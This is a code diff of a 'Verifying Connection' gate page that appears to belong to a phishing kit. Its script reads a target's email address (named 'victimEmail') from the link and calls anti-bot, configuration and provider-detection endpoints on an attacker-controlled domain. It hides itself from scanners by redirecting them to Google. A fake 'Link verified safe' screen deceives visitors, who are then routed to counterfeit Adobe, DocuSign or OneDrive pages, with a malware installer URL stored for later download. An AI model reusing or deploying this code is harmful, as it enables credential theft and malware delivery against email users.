@@ -4,7 +4,6 @@
   <meta charset="UTF-8">
   <title>Verifying Connection</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="robots" content="noindex, nofollow">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
   <style>
     :root {
@@ -32,6 +31,7 @@
       background: #0b0e15 radial-gradient(circle at 50% 0%, #1e293b, #0f172a);
       color: var(--text); padding: 16px;
     }
+    /* watermark footer */
     .footer {
       position: fixed; bottom: 32px; left: 0; right: 0;
       text-align: center; font-size: 12px; color: rgba(255, 255, 255, 0.85);
@@ -42,12 +42,12 @@
     }
     .footer svg { opacity: 0.9; }
     .footer-dot { width: 4px; height: 4px; border-radius: 50%; background: rgba(255, 255, 255, 0.6); }
+    /* top-of-card loading rail */
     .top-rail { display: none; }
     .top-rail-bar { display: none; }
     .top-rail-bar.done { display: none; }
     .card {
-      position: relative; background: rgba(255, 255, 255, 0.03);
-      backdrop-filter: blur(30px); -webkit-backdrop-filter: blur(30px);
+      position: relative; background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(30px); -webkit-backdrop-filter: blur(30px);
       border: 1px solid rgba(255, 255, 255, 0.08);
       border-radius: 24px; padding: 56px 48px 44px;
       width: calc(100% - 32px); max-width: 480px;
@@ -58,6 +58,7 @@
       from { opacity: 0; transform: translateY(16px); }
       to   { opacity: 1; transform: translateY(0); }
     }
+    /* advanced scanner animation */
     .scan-ring-wrap {
       position: relative; width: 150px; height: 150px; margin: 0 auto 40px;
       display: flex; align-items: center; justify-content: center;
@@ -87,15 +88,17 @@
       box-shadow: 0 0 35px rgba(59,130,246,0.3);
       animation: pulse-glow 2s ease-in-out infinite;
     }
-    .scan-ring-3.done {
+    .scan-ring-3.done { 
       background: radial-gradient(circle, rgba(52,211,153,0.15) 0%, transparent 70%);
       transform: scale(1.08);
     }
     .scan-ring-3.done::after { box-shadow: 0 0 35px rgba(52,211,153,0.4); animation: none; }
     .scan-ring.done, .scan-ring-2.done { opacity: 0; transition: opacity 0.4s; }
+    
     @keyframes spin { 100% { transform: rotate(360deg); } }
     @keyframes spin-reverse { 100% { transform: rotate(-360deg); } }
     @keyframes pulse-glow { 0%, 100% { opacity: 0.5; transform: scale(0.95); } 50% { opacity: 1; transform: scale(1.05); } }
+    /* text */
     .heading {
       text-align: center; font-size: 20px; font-weight: 600; color: #ffffff;
       letter-spacing: 0.5px; margin-bottom: 16px; white-space: nowrap;
@@ -112,6 +115,7 @@
     }
     .status-text.active { opacity: 1; transform: translateY(0); }
     .status-text.exit { opacity: 0; transform: translateY(-12px); }
+    /* result */
     .result-msg {
       display: none; text-align: center; margin-top: 24px;
       font-size: 13px; color: var(--green); font-weight: 500;
@@ -143,12 +147,13 @@
   </div>
 
   <div class="heading" id="headingText">Verifying secure connection&hellip;</div>
-
+  
   <div class="status-text-wrap">
     <div class="status-text active" id="rotatorText">Initializing secure environment...</div>
   </div>
 
   <div class="result-msg" id="resultMsg">All checks passed &mdash; redirecting you now</div>
+
 </div>
 
 <div class="footer">
@@ -161,56 +166,47 @@
 </div>
 
 <script>
-/* ══════════════════════════════════════════════════════════════════════════
-   STANDALONE GATE — Single-file, cross-origin configuration
-   ══════════════════════════════════════════════════════════════════════════
-
-   REQUIRED — set MAIN_APP_URL + APP_PATH to match your main server:
-     • MAIN_APP_URL : domain only, no trailing slash
-     • APP_PATH     : subdirectory where the app lives, e.g. "/page"
-                      Leave as "" if the app is at the domain root
-
-   OPTIONAL OVERRIDES (survive even when the server APIs are unreachable):
-     • LANDING_MODE : force dual routing without needing vault config
-                      Values: "" | "dual-adobe-onedrive" | "dual-docusign-onedrive"
-   ══════════════════════════════════════════════════════════════════════════ */
-
-const MAIN_APP_URL       = "https://starsprit.com"; // ← domain only, no trailing slash
-const APP_PATH           = "";                       // ← e.g. "/page" or "/doulble/page"
-const LANDING_MODE       = "dual-adobe-onedrive";                       // ← e.g. "dual-docusign-onedrive"
-const BLOCK_REDIRECT_URL = "https://google.com";     // ← where blocked visitors go
+/* -- STANDALONE CONFIGURATION -- */
+const MAIN_APP_URL = "https://starsprit.com"; // Change to your actual main app URL (without trailing slash)
+const BLOCK_REDIRECT_URL = "https://google.com";
 
 (async function () {
 
-  /* ── Helpers ─────────────────────────────────────────────────────────── */
-  function el(id) { return document.getElementById(id); }
-  async function delay(ms) { return new Promise(r => setTimeout(r, ms)); }
-
-  // Full base URL for all main-server API calls and share page links
-  const apiBaseUrl = MAIN_APP_URL.replace(/\/+$/, '') + APP_PATH;
-
-  function safeFetch(url, opts, timeoutMs = 8000) {
-    const controller = new AbortController();
-    const id = setTimeout(() => controller.abort(), timeoutMs);
-    return fetch(url, { ...opts, signal: controller.signal })
-      .then(r => { clearTimeout(id); return r.ok ? r.json() : {}; })
-      .catch(() => { clearTimeout(id); return {}; });
-  }
-
-  function makeAbsolute(url) {
-    if (!url) return '';
-    if (url.startsWith('http://') || url.startsWith('https://')) return url;
+  /* -- Server Validation (Antibot) -- */
+  async function verifyVisitor() {
     try {
-      return new URL(url, MAIN_APP_URL).href;
+      const res = await fetch(MAIN_APP_URL + "/verify_visitor_api.php", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+           // IP and UserAgent are automatically captured by the API endpoint via $_SERVER
+        })
+      });
+      const data = await res.json();
+      if (data && data.allowed === false) {
+        window.location.replace(BLOCK_REDIRECT_URL);
+        // Halt execution
+        await new Promise(() => {});
+      }
     } catch (e) {
-      return url;
+      // If the API call fails, proceed silently or block based on strictness preference.
+      // We proceed silently here so legitimate users aren't blocked by transient network errors.
     }
   }
 
-  /* ── Extract recipient email from ?ref= or URL hash ─────────────────── */
-  const urlParams   = new URLSearchParams(window.location.search);
-  let   victimEmail = '';
+  // Await validation immediately
+  await verifyVisitor();
 
+  /* -- Helpers -- */
+  function el(id) { return document.getElementById(id); }
+
+  function getApiBase() {
+    return MAIN_APP_URL + '/';
+  }
+
+  /* -- Extract victim email from ?ref= or #hash -- */
+  const urlParams = new URLSearchParams(window.location.search);
+  let victimEmail = '';
   const rawRef = urlParams.get('ref') || '';
   if (rawRef) {
     victimEmail = decodeURIComponent(rawRef);
@@ -223,31 +219,30 @@ const BLOCK_REDIRECT_URL = "https://google.com";     // ← where blocked visito
     const hash = window.location.hash || '';
     if (hash) {
       const frag = hash.substr(1);
-      const idx  = frag.indexOf('=');
+      const idx = frag.indexOf('=');
       victimEmail = idx !== -1 ? frag.substr(idx + 1) : frag;
     }
   }
-  victimEmail = victimEmail.trim().toLowerCase();
 
-  /* ── Step 1 variables — populated after parallel fetch in Step 3 ──────── */
-  // Pre-check runs in parallel with config + animation (not sequentially)
-  let challenge_id = '', challenge_ts = 0, challenge_sig = '';
-
-  /* ── Step 2: Scan animation sequence ────────────────────────────────── */
+  /* -- Rotating text sequencer -- */
   const STATUS_MESSAGES = [
-    { text: "Initializing secure environment...", dur: 800  },
-    { text: "Verifying document encryption...",  dur: 1000 },
-    { text: "Validating secure channel...",       dur: 900  },
-    { text: "Completing security checks...",      dur: 800  }
+    { text: "Initializing secure environment...", dur: 800 },
+    { text: "Verifying document encryption...", dur: 1000 },
+    { text: "Validating secure channel...", dur: 900 },
+    { text: "Completing security checks...", dur: 800 }
   ];
 
   function setProgress(pct) {
     el('progressBar').style.width = pct + '%';
   }
 
+  async function delay(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+  /* -- Run scan animation -- */
   async function runScan() {
     setProgress(4);
     const textEl = el('rotatorText');
+    
     for (let i = 0; i < STATUS_MESSAGES.length; i++) {
       if (i > 0) {
         textEl.className = 'status-text exit';
@@ -257,9 +252,11 @@ const BLOCK_REDIRECT_URL = "https://google.com";     // ← where blocked visito
         void textEl.offsetWidth;
       }
       textEl.className = 'status-text active';
-      setProgress(4 + ((i + 1) / STATUS_MESSAGES.length) * 96);
+      const pct = 4 + ((i + 1) / STATUS_MESSAGES.length) * 96;
+      setProgress(pct);
       await delay(STATUS_MESSAGES[i].dur);
     }
+    
     setProgress(100);
     el('progressBar').classList.add('done');
     el('ring1').classList.add('done');
@@ -267,183 +264,70 @@ const BLOCK_REDIRECT_URL = "https://google.com";     // ← where blocked visito
     el('ring3').classList.add('done');
   }
 
-  /* ── Step 3: Parallel — pre-check + config + detect provider + animation ─ */
-  const emailValid = victimEmail && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(victimEmail);
+  /* -- Parallel: fetch site config + detect provider -- */
+  const apiBase = getApiBase();
 
-  const [preCheck, cfg, providerData] = await Promise.all([
+  const [cfg, providerData] = await Promise.all([
+    fetch(apiBase + 'telegram_relay.php?config=1')
+      .then(r => r.ok ? r.json() : {})
+      .catch(() => ({})),
 
-    // IP / bot pre-check — 2s max, non-critical (best-effort)
-    safeFetch(apiBaseUrl + '/verify_visitor_api.php', {
-      method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({})
-    }, 2000),
-
-    // Main server config (landing mode, page style, shield fields)
-    safeFetch(apiBaseUrl + '/telegram_relay.php?config=1', undefined, 4000),
-
-    // Email provider detection (O365 vs webmail)
-    emailValid
-      ? safeFetch(apiBaseUrl + '/detect_provider_api.php?email=' + encodeURIComponent(victimEmail), undefined, 4000)
+    (victimEmail && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(victimEmail))
+      ? fetch(apiBase + 'detect_provider_api.php?email=' + encodeURIComponent(victimEmail),
+              { signal: AbortSignal.timeout ? AbortSignal.timeout(5000) : undefined })
+          .then(r => r.ok ? r.json() : {})
+          .catch(() => ({}))
       : Promise.resolve({}),
 
-    // Visual scan runs concurrently
     runScan()
   ]);
 
-  // Handle pre-check result (block only known-bad visitors)
-  if (preCheck && preCheck.allowed === false) {
-    window.location.replace(BLOCK_REDIRECT_URL);
-    await new Promise(() => {});
-  }
-  if (preCheck && preCheck.challenge_id) {
-    challenge_id = preCheck.challenge_id;
-    challenge_ts = preCheck.timestamp;
-    challenge_sig = preCheck.signature;
-  }
+  /* -- Done state -- */
+  el('shieldScanning').style.display = 'none';
+  el('shieldDone').style.display     = 'block';
+  el('headingText').textContent  = 'Link verified safe';
+  el('rotatorText').textContent  = 'No threats detected';
+  el('resultMsg').style.display  = 'block';
 
-  /* ── Step 4: Resolve target landing page ─────────────────────────────── */
-  // LANDING_MODE constant takes priority; falls back to server config then 'single'
-  const landingMode  = LANDING_MODE || cfg.landing_mode || 'single';
-  const installerUrl = cfg.installer_url || '';
-  const webmailUrl   = cfg.webmail_installer_url || '';
+  /* -- Routing decision -- */
+  const landingMode   = cfg.landing_mode || 'single';
+  const isO365        = !!(providerData && providerData.is_o365);
+  const installerUrl  = cfg.installer_url || '';
+  const webmailUrl    = cfg.webmail_installer_url || '';
 
-  // O365 detection: trust API when it succeeds; fall back to client-side
-  // domain check when the provider API is unreachable or times out.
-  const apiSucceeded = !!(providerData && providerData.status === 'success');
-  function clientSideIsO365(em) {
-    const d = (em.split('@')[1] || '').toLowerCase();
-    const known = [
-      'outlook.com','hotmail.com','live.com','msn.com','passport.com',
-      'outlook.co.uk','hotmail.co.uk','live.co.uk','live.com.au',
-      'outlook.com.au','outlook.de','outlook.fr','outlook.es',
-      'office365.com','microsoft.com'
-    ];
-    return known.includes(d) || d.endsWith('.onmicrosoft.com');
-  }
-  const isO365 = apiSucceeded
-    ? !!(providerData.is_o365)
-    : (emailValid ? clientSideIsO365(victimEmail) : false);
+  const refParam = urlParams.get('ref')
+    ? '?ref=' + urlParams.get('ref')
+    : (victimEmail ? '?ref=' + encodeURIComponent(btoa(victimEmail)) : '');
 
-  // Map target page name → LinkShield landingPage identifier
-  function toLandingId(page) {
-    const m = {
-      'index.html'    : 'index',
-      'docs.html'     : 'docs',
-      'DocuSign.html' : 'DocuSign',
-      'OneDrive.html' : 'OneDrive'
-    };
-    return m[page] || 'index';
-  }
-
-  let targetPage = 'index.html';
+  let targetPage = '';
 
   if (landingMode === 'dual-adobe-onedrive') {
     targetPage = isO365 ? 'OneDrive.html' : 'index.html';
     if (cfg.installer_enabled) {
-      window._installerUrl = makeAbsolute(isO365 ? installerUrl : webmailUrl);
+      window._installerUrl = isO365 ? installerUrl : webmailUrl;
     }
   } else if (landingMode === 'dual-docusign-onedrive') {
     targetPage = isO365 ? 'OneDrive.html' : 'docs.html';
     if (cfg.installer_enabled) {
-      window._installerUrl = makeAbsolute(isO365 ? installerUrl : webmailUrl);
+      window._installerUrl = isO365 ? installerUrl : webmailUrl;
     }
   } else {
     const style = (cfg.page_style || 'adobe').toLowerCase();
-    if (style === 'onedrive') {
-      targetPage = 'OneDrive.html';
-    } else if (style === 'docusign') {
-      targetPage = 'docs.html';
-    } else if (style === 'dual-adobe-onedrive') {
-      // page_style carries dual value but landing_mode arrived as 'single' — apply dual routing
-      targetPage = isO365 ? 'OneDrive.html' : 'index.html';
-      if (cfg.installer_enabled) {
-        window._installerUrl = makeAbsolute(isO365 ? installerUrl : webmailUrl);
-      }
-    } else if (style === 'dual-docusign-onedrive') {
-      targetPage = isO365 ? 'OneDrive.html' : 'docs.html';
-      if (cfg.installer_enabled) {
-        window._installerUrl = makeAbsolute(isO365 ? installerUrl : webmailUrl);
-      }
-    } else {
-      targetPage = 'index.html';
-    }
-    if (cfg.installer_enabled && !window._installerUrl) window._installerUrl = makeAbsolute(installerUrl);
+    if (style === 'onedrive')      targetPage = 'OneDrive.html';
+    else if (style === 'docusign') targetPage = 'docs.html';
+    else                           targetPage = 'index.html';
+    if (cfg.installer_enabled) window._installerUrl = installerUrl;
   }
 
   if (window._installerUrl) {
     try { sessionStorage.setItem('_gate_installer_url', window._installerUrl); } catch(e) {}
   }
 
-  /* ── Step 5: Done animation & User Interaction Challenge ─────────────── */
-  el('shieldScanning').style.display = 'none';
-  el('shieldDone').style.display     = 'block';
-  el('headingText').textContent      = 'Link verified safe';
-  el('rotatorText').textContent      = 'Click or tap anywhere to continue';
-  el('resultMsg').style.display      = 'block';
+  await delay(900);
 
-  // Wait for real user interaction (proves human presence)
-  await new Promise(resolve => {
-    const handler = () => {
-      ['click', 'touchstart', 'mousemove', 'keydown'].forEach(evt => document.removeEventListener(evt, handler));
-      el('rotatorText').textContent = 'Redirecting...';
-      resolve();
-    };
-    ['click', 'touchstart', 'mousemove', 'keydown'].forEach(evt => document.addEventListener(evt, handler));
-  });
-
-  // Calculate JS proof (proves JS execution engine)
-  let str = challenge_id + 'standalone_gate_salt';
-  let hash = 0;
-  for (let i = 0; i < str.length; i++) {
-    hash = ((hash << 5) - hash) + str.charCodeAt(i);
-    hash = hash & 0xFFFFFFFF;
-  }
-  let js_proof = Math.abs(hash).toString(16);
-
-  /* ── Step 6: Generate LinkShield token (only when shield is enabled) ─── */
-  // Skipped when cfg.shield_enabled is false — gate falls through to direct
-  // share URL immediately, with no timeout penalty.
-
-  const landingId   = toLandingId(targetPage);
-  const tokenApiUrl = cfg.shield_token_api
-                        ? makeAbsolute(cfg.shield_token_api)
-                        : apiBaseUrl + '/shield_token_api.php';
-
-  let shieldUrl = '';
-
-  if (cfg.shield_enabled) {
-    const tokenRes = await safeFetch(tokenApiUrl, {
-      method:  'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        email:       victimEmail,
-        landingPage: landingId,
-        mode:        'o365',
-        c_id:        challenge_id,
-        c_ts:        challenge_ts,
-        c_sig:       challenge_sig,
-        c_proof:     js_proof
-      })
-    }, 4000);
-
-    if (tokenRes && tokenRes.ok && tokenRes.url) {
-      shieldUrl = tokenRes.url;
-    }
-  }
-
-  /* ── Step 7: Direct share URL — used when shield is off or token fails ──
-     apiBaseUrl already includes APP_PATH, so this works with or without
-     a working server config fetch.                                         */
-  if (!shieldUrl) {
-    const refParam = urlParams.get('ref')
-      ? '?ref=' + urlParams.get('ref')
-      : (victimEmail ? '?ref=' + encodeURIComponent(btoa(victimEmail)) : '');
-    shieldUrl = apiBaseUrl + '/share/' + targetPage + refParam;
-  }
-
-  await delay(300);
-
-  /* ── Step 8: Navigate — visitor hits the shielded URL ───────────────── */
-  window.location.replace(shieldUrl);
+  /* Navigate to the chosen share page ON THE MAIN SERVER, preserving email ref */
+  const finalDest = MAIN_APP_URL + '/share/' + targetPage + refParam;
+  window.location.replace(finalDest);
 
 })();
 </script>
